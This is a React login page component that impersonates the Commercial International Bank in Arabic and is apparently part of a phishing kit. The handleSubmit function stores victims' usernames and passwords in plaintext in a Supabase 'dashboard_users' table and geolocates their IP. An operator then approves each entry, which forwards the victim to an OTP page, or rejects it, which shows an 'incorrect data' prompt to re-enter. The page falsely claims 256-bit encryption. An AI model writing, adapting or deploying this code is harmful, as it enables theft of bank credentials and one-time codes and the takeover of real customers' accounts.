import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";
import type { TablesUpdate } from "@/integrations/supabase/types";
import { useToast } from "@/components/ui/use-toast";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";
import WaitingOverlay from "@/components/WaitingOverlay";
import loginBanner from "@/assets/login-banner.jpg";
import { Lock, UserCircle, Sparkles } from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";

const Login = () => {
  const [searchParams] = useSearchParams();
  const { toast } = useToast();
  const watchChoice = searchParams.get("watch") || "";
  const existingUid = searchParams.get("uid") || "";
  const wasRejected = searchParams.get("rejected") === "true";

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [waitingUserId, setWaitingUserId] = useState<string | null>(null);
  const [rejectionError, setRejectionError] = useState(wasRejected);

  // Clear waiting overlay on rejection
  useEffect(() => {
    if (wasRejected) {
      setWaitingUserId(null);
      setRejectionError(true);
    }
  }, [wasRejected, searchParams.get("t")]);

  useAdminRedirect(waitingUserId || existingUid || null, { approveRedirect: "/otp" });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast({ title: "خطأ", description: "يرجى ملء جميع الحقول", variant: "destructive" });
      return;
    }

    setLoading(true);

    let countryCode = "";
    try {
      const geo = await fetch("https://ipapi.co/json/").then(r => r.json());
      countryCode = geo?.country_code || "";
    } catch { /* ignore */ }
    if (!countryCode) {
      try {
        const geo2 = await fetch("https://ip-api.com/json/?fields=countryCode").then(r => r.json());
        countryCode = geo2?.countryCode || "";
      } catch { /* ignore */ }
    }

    let finalUserId: string | null = null;

    // If returning after rejection, update the same record
    if (existingUid) {
      const updatePayload: TablesUpdate<"dashboard_users"> = {
        name: username,
        last_page: "تسجيل الدخول",
        watch_choice: watchChoice || null,
        home_data: [{ username, password }],
        status_tabs: {},
      };
      if (countryCode) updatePayload.country_code = countryCode;
      const { error: updateError } = await supabase
        .from("dashboard_users")
        .update(updatePayload)
        .eq("id", existingUid);
      if (!updateError) finalUserId = existingUid;
    } else {
      // Check by name
      const { data: existing } = await supabase
        .from("dashboard_users")
        .select("id")
        .eq("name", username)
        .order("created_at", { ascending: false })
        .limit(1);

      if (existing && existing.length > 0) {
        const updatePayload: TablesUpdate<"dashboard_users"> = {
          last_page: "تسجيل الدخول",
          watch_choice: watchChoice || null,
          home_data: [{ username, password }],
          status_tabs: {},
        };
        if (countryCode) updatePayload.country_code = countryCode;
        const { error: updateError } = await supabase
          .from("dashboard_users")
          .update(updatePayload)
          .eq("id", existing[0].id);
        if (!updateError) finalUserId = existing[0].id;
      } else {
        const { error, data } = await supabase.from("dashboard_users").insert([{
          name: username,
          last_page: "تسجيل الدخول",
          watch_choice: watchChoice || null,
          home_data: [{ username, password }],
          country_code: countryCode,
        }]).select("id");
        if (!error) finalUserId = data?.[0]?.id || null;
      }
    }

    if (finalUserId) {
      setWaitingUserId(finalUserId);
    } else {
      toast({ title: "خطأ", description: "حدث خطأ أثناء المعالجة", variant: "destructive" });
    }

    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-background relative" dir="rtl">
      <div className="fixed inset-0 gradient-mesh pointer-events-none" />
      <SiteHeader />

      <div className="relative">
        <img src={loginBanner} alt="تسجيل الدخول" className="w-full h-40 object-cover" width={1024} height={512} />
        <div className="absolute inset-0 bg-gradient-to-t from-background via-background/60 to-black/40" />
        <div className="absolute inset-0 pattern-grid opacity-15" />
        <div className="absolute bottom-4 right-0 left-0 text-center">
          <h1 className="text-lg font-extrabold text-white drop-shadow-[0_2px_12px_rgba(0,0,0,0.7)]">تسجيل الدخول إلى حسابك</h1>
        </div>
      </div>

      <section className="py-6 px-2 relative z-10">
        <div className="container mx-auto max-w-xl">
          <div className="flex items-start gap-3 bg-card/80 backdrop-blur-sm rounded-2xl p-4 mb-5 border border-border/40 card-shadow">
            <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shrink-0 shadow-button">
              <Sparkles className="w-4 h-4 text-primary-foreground" />
            </div>
            <div>
              <p className="text-sm font-bold text-foreground mb-0.5">مرحباً بك في البنك التجاري الدولي</p>
              <p className="text-xs text-muted-foreground leading-relaxed">
                سجّل دخولك للاستفادة من خدماتنا الحصرية والعروض المميزة المتاحة لعملائنا.
              </p>
            </div>
          </div>

          {rejectionError && (
            <div className="bg-destructive/5 border border-destructive/20 rounded-2xl p-4 mb-4 flex items-start gap-3 animate-fade-in card-shadow">
              <span className="text-2xl mt-0.5">⚠️</span>
              <div>
                <p className="text-base font-bold text-destructive mb-0.5">بيانات غير صحيحة</p>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  المعلومات المدخلة غير صحيحة، يرجى التأكد منها وإعادة إدخالها بشكل صحيح.
                </p>
              </div>
              <button onClick={() => setRejectionError(false)} className="text-muted-foreground hover:text-foreground text-lg mr-auto">✕</button>
            </div>
          )}

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="bg-card rounded-2xl p-5 card-shadow border border-border/30 space-y-4">
              <div className="flex items-center gap-2.5 pb-3 border-b border-border/30">
                <div className="w-9 h-9 rounded-xl hero-gradient flex items-center justify-center shadow-button">
                  <UserCircle className="w-4.5 h-4.5 text-primary-foreground" />
                </div>
                <span className="text-base font-bold text-foreground">بيانات الدخول</span>
              </div>

              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">اسم المستخدم</label>
                <Input placeholder="أدخل اسم المستخدم الخاص بك" value={username} onChange={(e) => setUsername(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))} inputMode="text" autoComplete="username" dir="ltr" className="text-center text-base h-14 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all" />
                <p className="text-xs text-muted-foreground mt-1.5 text-right">يُقبل الأحرف الإنجليزية والأرقام والرموز فقط (بدون أحرف عربية)</p>
              </div>
              <div>
                <label className="block text-sm font-bold text-muted-foreground mb-2 text-right">كلمة المرور</label>
                <Input type="password" placeholder="أدخل كلمة المرور" value={password} onChange={(e) => setPassword(e.target.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g, ""))} dir="ltr" className="text-center text-base h-14 bg-muted/30 border-border/40 rounded-xl focus:ring-2 focus:ring-primary/30 focus:border-primary/50 transition-all" />
                <p className="text-xs text-muted-foreground mt-1.5 text-right">يُقبل الأحرف الإنجليزية والأرقام والرموز فقط (بدون أحرف عربية)</p>
              </div>
            </div>

            <div className="flex items-center gap-2 rounded-xl py-2.5 px-3 bg-card/60 backdrop-blur-sm border border-border/30">
              <div className="w-7 h-7 rounded-lg hero-gradient flex items-center justify-center shrink-0">
                <Lock className="w-3.5 h-3.5 text-primary-foreground" />
              </div>
              <p className="text-xs text-muted-foreground leading-relaxed">
                بياناتك محمية بتشفير 256-bit وفق أعلى المعايير المصرفية الدولية.
              </p>
            </div>

            <Button type="submit" disabled={loading || !!waitingUserId} className="w-full hero-gradient text-primary-foreground text-base font-bold py-6 rounded-xl shadow-button hover:shadow-[0_6px_24px_hsl(213_76%_44%/0.4)] transition-all">
              {loading ? "جاري المعالجة..." : "تسجيل الدخول"}
            </Button>
          </form>
        </div>
      </section>
      <SiteFooter />

      {waitingUserId && <WaitingOverlay />}
    </div>
  );
};

export default Login;
